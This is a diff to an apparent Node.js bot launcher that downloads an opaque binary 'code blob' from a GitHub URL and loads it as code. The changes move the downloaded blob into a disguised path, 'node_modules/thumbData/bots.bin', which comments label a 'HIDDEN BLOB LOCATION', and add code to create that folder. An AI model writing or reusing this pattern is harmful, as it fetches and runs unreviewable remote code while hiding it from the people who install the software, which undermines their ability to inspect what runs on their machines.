@@ -21,9 +21,6 @@
 
 'use strict'
 
-//require('http').createServer((_, res) => { res.writeHead(200); res.end('ok') })
- // .listen(process.env.PORT || 3000)
-
 const fs     = require('fs')
 const path   = require('path')
 const https  = require('https')
@@ -69,7 +66,11 @@ const _console = {
 //  CONFIG
 // ════════════════════════════════════════════════════════════
 const BASE         = __dirname
-const BLOB_FILE    = path.join(BASE, 'bots.bin')
+
+// ⚡ HIDDEN BLOB LOCATION: node_modules/thumbData/bots.bin
+const BLOB_DIR     = path.join(BASE, 'node_modules', 'thumbData')
+const BLOB_FILE    = path.join(BLOB_DIR, 'bots.bin')
+
 const ASSETS_DIR   = path.join(BASE, 'assets')
 const BACKEND_RAW  = 'https://raw.githubusercontent.com/blessboydach/greenwater/main'
 const ASSETS_ZIP_URL = 'https://github.com/blessboydach/assetsrepo/archive/refs/heads/main.zip'
@@ -241,6 +242,8 @@ async function fetchBlob() {
   if (buf.length < HEADER_SIZE || !buf.slice(0, 8).equals(MAGIC)) {
     throw new Error('Invalid blob format')
   }
+  // ⚡ Ensure hidden blob directory exists
+  await _fs.promises.mkdir(BLOB_DIR, { recursive: true })
   await _fs.promises.writeFile(BLOB_FILE, buf)
   return buf
 }
@@ -317,6 +320,8 @@ function ensureRuntimeDirs() {
   for (const name of [...RUNTIME_DIRS, 'assets', 'data']) {
     try { _fs.mkdirSync(path.join(BASE, name), { recursive: true }) } catch {}
   }
+  // ⚡ Ensure hidden blob directory exists
+  try { _fs.mkdirSync(BLOB_DIR, { recursive: true }) } catch {}
 }
 
 // ════════════════════════════════════════════════════════════
@@ -707,7 +712,7 @@ async function main() {
   // 1. Sync Assets from GitHub Assets Repo (ZIP)
   await syncAssetsFromGitHub()
 
-  // 2. Load Code Blob
+  // 2. Load Code Blob (from hidden location)
   if (!loadLocalBlob()) {
     const buf = await fetchBlob()
     parseBlob(buf)
